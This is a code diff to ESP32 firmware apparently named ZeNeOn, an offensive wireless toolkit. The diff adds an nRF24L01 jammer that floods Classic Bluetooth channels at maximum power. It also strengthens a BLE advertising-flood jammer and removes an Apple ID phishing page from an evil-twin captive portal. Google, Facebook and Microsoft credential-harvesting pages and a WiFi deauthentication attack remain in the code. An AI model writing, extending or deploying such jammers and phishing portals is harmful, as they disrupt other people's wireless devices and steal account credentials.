@@ -10,6 +10,8 @@
 #include "esp_bt_main.h"
 #include "esp_gap_ble_api.h"
 #include "esp_bt_defs.h"
+#include <SPI.h>
+#include <RF24.h>
 
 WebServer server(80);
 DNSServer dnsServer;
@@ -25,6 +27,11 @@ unsigned long btJamEndTime = 0;
 unsigned long btJamStartTime = 0;
 unsigned long lastBtJam = 0;
 uint32_t btJamPktsSent = 0;
+bool nrfJamming = false;
+unsigned long nrfJamEndTime = 0;
+unsigned long lastNrfJam = 0;
+uint32_t nrfJamPktsSent = 0;
+bool nrfReady = false;
 unsigned long deauthEndTime = 0;
 unsigned long deauthStartTime = 0;
 unsigned long lastDeauth = 0;
@@ -73,7 +80,7 @@ int targetChannel = 1;
 uint8_t ownAPMAC[6] = {0};
 String evilTwinSSID = "";
 int credentialsCount = 0;
-int portalTemplate = 0; // 0=Generic WiFi, 1=Google, 2=Facebook, 3=Microsoft, 4=Apple
+int portalTemplate = 0; // 0=Generic WiFi, 1=Google, 2=Facebook, 3=Microsoft
 
 #define MAX_CLIENTS 32
 uint8_t clientMACs[MAX_CLIENTS][6];
@@ -193,7 +200,7 @@ String header() {
 <!DOCTYPE html><html><head>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <meta charset="UTF-8">
-<title>{ZeNeOn}</title>
+<title>ZeNeOn</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#05080f;color:#00d4ff;font-family:'Courier New',monospace;min-height:100vh;padding-bottom:70px;overflow-x:hidden}
@@ -252,7 +259,7 @@ input::placeholder{color:rgba(0,160,255,0.35)}
 .footer a:hover{color:#fff}
 @media(max-width:600px){.grid{grid-template-columns:1fr}.eapol-grid{grid-template-columns:1fr 1fr}}
 </style></head><body>
-<div class="top"><h1>{ZeNeOn}</h1><div class="sub">ESP32 WiFi Security Framework v5.1</div></div>
+<div class="top"><h1>ZeNeOn</h1><div class="sub">ESP32 WiFi Security Framework v5.1</div></div>
 <div class="container">
 )rawliteral";
 }
@@ -260,15 +267,12 @@ input::placeholder{color:rgba(0,160,255,0.35)}
 String homeUI() {
   return header() + R"rawliteral(
 <div class="card">
-<h3>Select Module</h3>
-<button onclick="location.href='/deauth'">☢ Deauth + Handshake Capture</button>
-<button class="secondary" onclick="location.href='/evilui'">👁 Evil Twin Attack</button>
-<button class="secondary" onclick="location.href='/spamui'">📡 WiFi Spam</button>
-<button class="secondary" onclick="location.href='/btjamui'">🔵 Bluetooth Jammer</button>
-</div>
-<div class="card">
-<h3>System Info</h3>
-<div class="status">AP SSID: ZeNeOn | Status: Online | Framework: v5.1</div>
+<h3>Select Attack</h3>
+<button onclick="location.href='/deauth'">Deauth Attack</button>
+<button class="secondary" onclick="location.href='/evilui'">Evil Twin Attack</button>
+<button class="secondary" onclick="location.href='/spamui'">WiFi Spam</button>
+<button class="secondary" onclick="location.href='/btjamui'">BLE Jammer</button>
+<button class="secondary" onclick="location.href='/nrfjamui'">BT Jammer (nRF24)</button>
 </div>
 <div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.1</div>
 </div></body></html>
@@ -610,7 +614,6 @@ String evilUI() {
 <option value="1">Google Sign-In</option>
 <option value="2">Facebook Login</option>
 <option value="3">Microsoft Account</option>
-<option value="4">Apple ID Login</option>
 </select>
 <button onclick="startEvil()">Launch Evil Twin</button>
 <button class="danger" onclick="stopEvil()">Stop Evil Twin</button>
@@ -684,7 +687,7 @@ var startSpam=function(c){
   fetch('/spam?count='+c).then(r=>r.text()).then(d=>{
     document.getElementById('status').className='status';
     document.getElementById('status').classList.remove('hidden');
-    document.getElementById('status').innerHTML='📡 Spamming '+c+' fake networks...';
+    document.getElementById('status').innerHTML='Spamming '+c+' fake networks...';
   });
 }
 var stopSpam=function(){
@@ -931,42 +934,6 @@ body{background:#f2f2f2;min-height:100vh;display:flex;align-items:center;justify
 <button type="submit" class="btn">Sign in</button>
 </form>
 <div class="ft">No account? <a href="#" style="color:#0067b8;text-decoration:none" onclick="return false">Create one!</a></div>
-</div>)rawliteral" + submitJS + "</body></html>";
-
-    case 4: // Apple ID Login
-      return R"rawliteral(
-<!DOCTYPE html><html><head>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
-<title>Apple ID</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Helvetica Neue',sans-serif}
-body{background:#f5f5f7;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:15px}
-.box{background:#fff;width:100%;max-width:400px;border-radius:16px;box-shadow:0 4px 16px rgba(0,0,0,0.08);padding:40px 36px;text-align:center;position:relative}
-.logo{font-size:48px;margin-bottom:12px;color:#333}
-.title{font-size:22px;font-weight:600;color:#1d1d1f;margin-bottom:4px}
-.sub{font-size:14px;color:#86868b;margin-bottom:28px}
-.fg{margin-bottom:16px;text-align:left}
-.fg label{display:block;font-size:12px;color:#86868b;margin-bottom:4px;font-weight:500}
-.fg input{width:100%;padding:12px 16px;border:1px solid #d2d2d7;border-radius:12px;font-size:17px;color:#1d1d1f;background:#fbfbfd}
-.fg input:focus{outline:none;border-color:#0071e3;box-shadow:0 0 0 3px rgba(0,113,227,0.15)}
-.fg input::placeholder{color:#86868b}
-.btn{width:100%;padding:14px;background:#0071e3;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:500;cursor:pointer;margin-top:8px;margin-bottom:16px}
-.btn:hover{background:#0077ed}
-.fl{font-size:14px;color:#0071e3;text-decoration:none;display:inline-block;margin-bottom:8px}
-.ft{margin-top:24px;font-size:12px;color:#86868b;border-top:1px solid #e5e5ea;padding-top:16px}
-)rawliteral" + loaderCSS + R"rawliteral(
-</style></head><body>
-<div class="box">)rawliteral" + loaderHTML + R"rawliteral(
-<div class="logo">&#63743;</div>
-<div class="title">Apple ID</div>
-<div class="sub">Sign in to access )rawliteral" + ssid + R"rawliteral(</div>
-<form id="lf" onsubmit="doLogin(event)">
-<div class="fg"><label>Apple ID</label><input type="text" id="u" name="username" placeholder="Email or Phone Number" required></div>
-<div class="fg"><label>Password</label><input type="password" id="p" name="password" placeholder="Password" required></div>
-<button type="submit" class="btn">Sign In</button>
-</form>
-<a href="#" class="fl" onclick="return false">Forgot Apple ID or password?</a>
-<div class="ft"><p>Your Apple ID is the account for all Apple services.</p></div>
 </div>)rawliteral" + submitJS + "</body></html>";
 
     default: // Generic WiFi Login (template 0)
@@ -1311,6 +1278,36 @@ void sendDeauthBurst() {
 
 /* ============ BLUETOOTH JAMMER ============ */
 static bool btInitialized = false;
+static volatile bool btAdvActive = false;
+static volatile bool btScanActive = false;
+
+// BLE advertising parameters (persistent so we can restart quickly)
+static esp_ble_adv_params_t btJamAdvParams;
+static esp_ble_scan_params_t btJamScanParams;
+
+// GAP event callback — required for BLE stack to function
+static void btJamGapCallback(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
+  switch (event) {
+    case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:
+      // Raw advertising data set, start advertising
+      esp_ble_gap_start_advertising(&btJamAdvParams);
+      break;
+    case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
+      btAdvActive = true;
+      break;
+    case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
+      btAdvActive = false;
+      break;
+    case ESP_GAP_BLE_SCAN_START_COMPLETE_EVT:
+      btScanActive = true;
+      break;
+    case ESP_GAP_BLE_SCAN_STOP_COMPLETE_EVT:
+      btScanActive = false;
+      break;
+    default:
+      break;
+  }
+}
 
 void btJamInit() {
   if (btInitialized) return;
@@ -1338,69 +1335,237 @@ void btJamInit() {
     esp_bt_controller_deinit();
     return;
   }
+
+  // Register GAP callback — critical, without this advertising silently fails
+  esp_ble_gap_register_callback(btJamGapCallback);
+
+  // Set max TX power for all BLE operations
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
+
+  // Pre-configure advertising params (fastest possible non-connectable)
+  memset(&btJamAdvParams, 0, sizeof(btJamAdvParams));
+  btJamAdvParams.adv_int_min = 0x0020; // 20ms minimum
+  btJamAdvParams.adv_int_max = 0x0020;
+  btJamAdvParams.adv_type = ADV_TYPE_NONCONN_IND;
+  btJamAdvParams.own_addr_type = BLE_ADDR_TYPE_RANDOM;
+  btJamAdvParams.channel_map = ADV_CHNL_ALL; // Channels 37, 38, 39
+  btJamAdvParams.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
+
+  // Pre-configure scan params (aggressive active scanning for more RF noise)
+  memset(&btJamScanParams, 0, sizeof(btJamScanParams));
+  btJamScanParams.scan_type = BLE_SCAN_TYPE_ACTIVE; // Active scan = sends SCAN_REQ
+  btJamScanParams.own_addr_type = BLE_ADDR_TYPE_RANDOM;
+  btJamScanParams.scan_filter_policy = BLE_SCAN_FILTER_ALLOW_ALL;
+  btJamScanParams.scan_interval = 0x0010; // 10ms — very aggressive
+  btJamScanParams.scan_window = 0x0010;   // 10ms — continuous scanning
+  btJamScanParams.scan_duplicate = BLE_SCAN_DUPLICATE_DISABLE;
+
+  btAdvActive = false;
+  btScanActive = false;
   btInitialized = true;
-  Serial.println("[BT] Bluetooth stack initialized");
+  Serial.println("[BT] Stack initialized (callback + max TX power)");
 }
 
 void btJamDeinit() {
   if (!btInitialized) return;
+  esp_ble_gap_stop_scanning();
   esp_ble_gap_stop_advertising();
-  delay(50);
+  delay(100); // Give BLE stack time to stop cleanly
   esp_bluedroid_disable();
   esp_bluedroid_deinit();
   esp_bt_controller_disable();
   esp_bt_controller_deinit();
+  btAdvActive = false;
+  btScanActive = false;
   btInitialized = false;
   Serial.println("[BT] Bluetooth stack released");
 }
 
 void sendBtJamBurst() {
-  // Rapidly cycle through BLE advertising with random data
-  // This floods the 3 BLE advertisement channels (37, 38, 39)
-  for (int burst = 0; burst < 5; burst++) {
-    uint8_t advData[31];
-    for (int i = 0; i < 31; i++) advData[i] = (uint8_t)esp_random();
-    // Set mandatory flags field
-    advData[0] = 0x02; // Length
-    advData[1] = 0x01; // Type: Flags
-    advData[2] = 0x06; // LE General + BR/EDR Not Supported
-    // Rest is random noise
+  if (!btInitialized) return;
 
-    esp_ble_adv_data_t adv;
-    memset(&adv, 0, sizeof(adv));
-    adv.set_scan_rsp = false;
-    adv.include_name = false;
-    adv.include_txpower = false;
-    adv.min_interval = 0x0006; // Fastest possible (7.5ms)
-    adv.max_interval = 0x0006;
-    adv.appearance = (uint16_t)esp_random();
-    adv.manufacturer_len = 20;
-    adv.p_manufacturer_data = &advData[3];
-    adv.flag = advData[2];
-
-    esp_ble_gap_config_adv_data(&adv);
-
-    esp_ble_adv_params_t advParams;
-    memset(&advParams, 0, sizeof(advParams));
-    advParams.adv_int_min = 0x0020; // 20ms
-    advParams.adv_int_max = 0x0020;
-    advParams.adv_type = ADV_TYPE_NONCONN_IND; // Non-connectable undirected
-    advParams.own_addr_type = BLE_ADDR_TYPE_RANDOM;
-    advParams.channel_map = ADV_CHNL_ALL; // All 3 adv channels
-    advParams.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
-
-    // Randomize the BLE source address each burst
+  // --- BLE Advertising flood ---
+  // Each burst: randomize address + data, push raw adv, let it transmit
+  for (int burst = 0; burst < 3; burst++) {
+    // Randomize BLE source address each burst
     esp_bd_addr_t randAddr;
     for (int i = 0; i < 6; i++) randAddr[i] = (uint8_t)esp_random();
-    randAddr[0] |= 0xC0; // Set as random static address
-    esp_ble_gap_set_rand_addr(randAddr);
-
-    esp_ble_gap_start_advertising(&advParams);
-    btJamPktsSent++;
-    delayMicroseconds(500);
+    randAddr[0] |= 0xC0; // Static random address
     esp_ble_gap_stop_advertising();
-    delayMicroseconds(200);
+    delay(2);
+    esp_ble_gap_set_rand_addr(randAddr);
+    delay(1);
+
+    // Build raw advertising payload with random noise
+    uint8_t rawAdv[31];
+    for (int i = 0; i < 31; i++) rawAdv[i] = (uint8_t)esp_random();
+    // Valid flags header so the packet isn't dropped by the controller
+    rawAdv[0] = 0x02; // Length
+    rawAdv[1] = 0x01; // Type: Flags
+    rawAdv[2] = 0x06; // General Discoverable + BR/EDR Not Supported
+
+    // Use RAW data inject — faster, bypasses struct validation
+    esp_ble_gap_config_adv_data_raw(rawAdv, 31);
+    // The GAP callback will auto-start advertising when data is set
+    delay(25); // Let at least one full advertising event transmit on all 3 channels
+
+    btJamPktsSent++;
   }
+
+  // --- Concurrent BLE scanning ---
+  // Active scanning sends SCAN_REQ packets = more RF interference on 2.4GHz
+  if (!btScanActive) {
+    esp_bd_addr_t scanAddr;
+    for (int i = 0; i < 6; i++) scanAddr[i] = (uint8_t)esp_random();
+    scanAddr[0] |= 0xC0;
+    esp_ble_gap_set_scan_params(&btJamScanParams);
+    esp_ble_gap_start_scanning(1); // Scan for 1 second
+    btJamPktsSent++;
+  }
+}
+
+/* ============ NRF24 CLASSIC BT JAMMER ============ */
+#define NRF_CE  4
+#define NRF_CSN 5
+RF24 nrfRadio(NRF_CE, NRF_CSN);
+
+// Classic BT uses 2402-2480 MHz = nRF24 channels 2-80
+static const uint8_t BT_CHANNELS[] = {
+  2, 4, 6, 8,10,12,14,16,18,20,22,24,26,28,30,32,34,36,38,40,
+  42,44,46,48,50,52,54,56,58,60,62,64,66,68,70,72,74,76,78,80
+};
+static const int BT_CH_COUNT = sizeof(BT_CHANNELS);
+static uint8_t nrfNoisePayload[32];
+
+bool nrfJamInit() {
+  SPI.begin(18, 19, 23, 5); // SCK, MISO, MOSI, SS
+  if (!nrfRadio.begin()) {
+    Serial.println("[NRF] Module not found! Check wiring.");
+    addEvent("NRF24 not found — check wiring");
+    nrfReady = false;
+    return false;
+  }
+  nrfRadio.setAutoAck(false);
+  nrfRadio.setPALevel(RF24_PA_MAX);
+  nrfRadio.setDataRate(RF24_2MBPS);
+  nrfRadio.setCRCLength(RF24_CRC_DISABLED);
+  nrfRadio.setRetries(0, 0);
+  nrfRadio.setPayloadSize(32);
+  for (int i = 0; i < 32; i++) nrfNoisePayload[i] = (uint8_t)random(256);
+  uint8_t addr[6] = {'J','A','M','N','R','F'};
+  nrfRadio.openWritingPipe(addr);
+  nrfRadio.stopListening();
+  nrfReady = true;
+  Serial.println("[NRF] Jammer initialized — 2Mbps MAX power");
+  addEvent("NRF24 initialized — ready to jam");
+  return true;
+}
+
+void sendNrfJamBurst() {
+  if (!nrfReady) return;
+  for (int i = 0; i < BT_CH_COUNT; i++) {
+    nrfRadio.setChannel(BT_CHANNELS[i]);
+    // Randomize payload each channel for wider spectral interference
+    for (int j = 0; j < 32; j++) nrfNoisePayload[j] = (uint8_t)esp_random();
+    nrfRadio.writeFast(nrfNoisePayload, 32, true);
+    nrfJamPktsSent++;
+  }
+  nrfRadio.txStandBy();
+}
+
+void nrfJamDeinit() {
+  nrfRadio.powerDown();
+  nrfJamming = false;
+  nrfReady = false;
+  Serial.printf("[NRF] Jammer stopped: %u pkts\n", nrfJamPktsSent);
+}
+
+String nrfJamUI() {
+  return header() + R"rawliteral(
+<div class="card">
+<h3>📻 Classic BT Jammer (nRF24)</h3>
+<p style="margin-bottom:8px;opacity:0.7">Jam Classic Bluetooth (A2DP speakers, headphones) using nRF24L01 module</p>
+<p style="margin-bottom:15px;font-size:12px;color:#ff9900">⚠ nRF24L01 must be wired: CE→GPIO4, CSN→GPIO5, SCK→18, MOSI→23, MISO→19, 3.3V+GND</p>
+<div id="status" class="status hidden"></div>
+<div class="grid">
+<button onclick="startNrf(15)">15 Sec</button>
+<button onclick="startNrf(30)">30 Sec</button>
+<button onclick="startNrf(60)">60 Sec</button>
+<button onclick="startNrf(120)">120 Sec</button>
+</div>
+<button class="danger" style="margin-top:15px" onclick="stopNrf()">⬛ Stop Jammer</button>
+<div id="liveCard" class="card hidden" style="margin-top:15px">
+<h3>Jammer Status</h3>
+<div class="capture-quality">
+<div class="cq-item"><div class="cq-val" id="nrfPkts">0</div><div class="cq-lbl">Packets Sent</div></div>
+<div class="cq-item"><div class="cq-val" id="nrfTime">0s</div><div class="cq-lbl">Elapsed</div></div>
+<div class="cq-item"><div class="cq-val" id="nrfRemain">0s</div><div class="cq-lbl">Remaining</div></div>
+</div>
+<div class="progress-outer"><div class="progress-inner" id="nrfProg" style="width:0%"></div></div>
+<div id="nrfLog" style="margin-top:10px;background:#020408;border:1px solid rgba(255,100,0,0.4);border-radius:8px;padding:10px;height:120px;overflow-y:auto;font-size:12px;color:#ff9900"></div>
+</div>
+</div>
+<button class="secondary" onclick="location.href='/'">← Back to Home</button>
+<script>
+var nrfPoll=null;
+var startNrf=function(t){
+  fetch('/nrfjam?time='+t).then(r=>r.text()).then(d=>{
+    if(d.indexOf('not found')>=0){
+      document.getElementById('status').className='status';
+      document.getElementById('status').classList.remove('hidden');
+      document.getElementById('status').innerHTML='❌ '+d;
+      return;
+    }
+    document.getElementById('status').className='status';
+    document.getElementById('status').classList.remove('hidden');
+    document.getElementById('status').innerHTML='📻 Classic BT Jammer active for '+t+'s';
+    document.getElementById('liveCard').classList.remove('hidden');
+    addNrfLog('📻 nRF24 Jammer started ('+t+'s) — jamming 79 BT channels');
+    startNrfPoll(t);
+  });
+}
+var stopNrf=function(){
+  if(nrfPoll) clearInterval(nrfPoll);
+  fetch('/stopnrfjam').then(r=>r.text()).then(d=>{
+    document.getElementById('status').className='status';
+    document.getElementById('status').classList.remove('hidden');
+    document.getElementById('status').innerHTML='Jammer stopped.';
+    addNrfLog('⬛ Jammer stopped');
+  });
+}
+var addNrfLog=function(msg){
+  var el=document.getElementById('nrfLog');
+  var d=document.createElement('div');
+  d.textContent=msg; el.appendChild(d); el.scrollTop=el.scrollHeight;
+}
+var startNrfPoll=function(totalTime){
+  var startT=Date.now();
+  if(nrfPoll) clearInterval(nrfPoll);
+  nrfPoll=setInterval(function(){
+    fetch('/nrfjamstatus').then(r=>r.json()).then(d=>{
+      document.getElementById('nrfPkts').textContent=d.pkts;
+      var elapsed=Math.round((Date.now()-startT)/1000);
+      document.getElementById('nrfTime').textContent=elapsed+'s';
+      var remain=Math.max(0,totalTime-elapsed);
+      document.getElementById('nrfRemain').textContent=remain+'s';
+      var pct=Math.min(100,Math.round((elapsed/totalTime)*100));
+      document.getElementById('nrfProg').style.width=pct+'%';
+      if(!d.active){
+        clearInterval(nrfPoll);
+        document.getElementById('status').className='status success';
+        document.getElementById('status').innerHTML='✓ Classic BT Jam complete — '+d.pkts+' packets sent across 79 channels';
+        document.getElementById('nrfProg').style.width='100%';
+        addNrfLog('✓ Jam complete: '+d.pkts+' packets sent');
+      }
+    }).catch(function(){});
+  },800);
+}
+</script>
+<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.1</div>
+</div></body></html>
+)rawliteral";
 }
 
 /* ============ WIFI SPAM ============ */
@@ -1592,6 +1757,7 @@ void setupRoutes() {
   server.on("/evilui", []() { server.send(200, "text/html", evilUI()); });
   server.on("/spamui", []() { server.send(200, "text/html", spamUI()); });
   server.on("/btjamui", []() { server.send(200, "text/html", btJamUI()); });
+  server.on("/nrfjamui", []() { server.send(200, "text/html", nrfJamUI()); });
 
   /* --- AJAX network scan (no page reload) --- */
   server.on("/scan", []() {
@@ -2013,13 +2179,51 @@ void setupRoutes() {
     server.send(200, "application/json", json);
   });
 
+  /* --- nRF24 Classic BT Jammer --- */
+  server.on("/nrfjam", []() {
+    int t = server.arg("time").toInt();
+    if (t < 5) t = 15;
+    if (t > 300) t = 300;
+    if (!nrfJamInit()) {
+      server.send(500, "text/plain", "nRF24 not found — check wiring (CE→GPIO4 CSN→GPIO5)");
+      return;
+    }
+    nrfJamPktsSent = 0;
+    nrfJamEndTime = millis() + (unsigned long)t * 1000UL;
+    nrfJamming = true;
+    lastNrfJam = 0;
+    Serial.printf("[NRF] Classic BT Jammer started for %ds\n", t);
+    addEvent("nRF24 Classic BT Jammer started for " + String(t) + "s");
+    server.send(200, "text/plain", "nRF24 jam started: " + String(t) + "s");
+  });
+
+  server.on("/stopnrfjam", []() {
+    nrfJamming = false;
+    if (nrfReady) nrfJamDeinit();
+    Serial.printf("[NRF] Jammer stopped: %u pkts\n", nrfJamPktsSent);
+    addEvent("nRF24 Jammer stopped: " + String(nrfJamPktsSent) + " pkts");
+    server.send(200, "text/plain", "nRF24 jam stopped");
+  });
+
+  server.on("/nrfjamstatus", []() {
+    String json = "{";
+    json += "\"active\":" + String(nrfJamming ? "true" : "false") + ",";
+    json += "\"pkts\":" + String(nrfJamPktsSent);
+    json += "}";
+    server.send(200, "application/json", json);
+  });
+
   /* --- Stop everything --- */
   server.on("/stop", []() {
-    bool wasActive = sniffing || deauthing || spamming || btJamming || capturingHandshake ||
+    bool wasActive = sniffing || deauthing || spamming || btJamming || nrfJamming || capturingHandshake ||
                      currentPhase != PHASE_IDLE;
     if (btJamming) {
       btJamming = false;
       if (btInitialized) { esp_ble_gap_stop_advertising(); btJamDeinit(); }
+    }
+    if (nrfJamming) {
+      nrfJamming = false;
+      if (nrfReady) nrfJamDeinit();
     }
     bool wasAttacking = currentPhase != PHASE_IDLE;
 
@@ -2277,13 +2481,29 @@ void loop() {
   if (btJamming) {
     if (now >= btJamEndTime) {
       btJamming = false;
+      esp_ble_gap_stop_scanning();
       esp_ble_gap_stop_advertising();
+      delay(50);
       btJamDeinit();
       Serial.printf("[BT] Jam complete: %u pkts\n", btJamPktsSent);
       addEvent("BT Jam complete: " + String(btJamPktsSent) + " pkts sent");
-    } else if (now - lastBtJam >= 15) {
+    } else if (now - lastBtJam >= 100) {
+      // Send burst every ~100ms — allows each burst to actually transmit
       sendBtJamBurst();
       lastBtJam = now;
+    }
+  }
+
+  /* ---- NRF24 CLASSIC BT JAMMER ---- */
+  if (nrfJamming) {
+    if (now >= nrfJamEndTime) {
+      nrfJamming = false;
+      nrfJamDeinit();
+      Serial.printf("[NRF] Jam complete: %u pkts\n", nrfJamPktsSent);
+      addEvent("nRF24 Jam complete: " + String(nrfJamPktsSent) + " pkts sent");
+    } else {
+      // Jam as fast as possible — no delay, hop all 79 BT channels continuously
+      sendNrfJamBurst();
     }
   }
 }
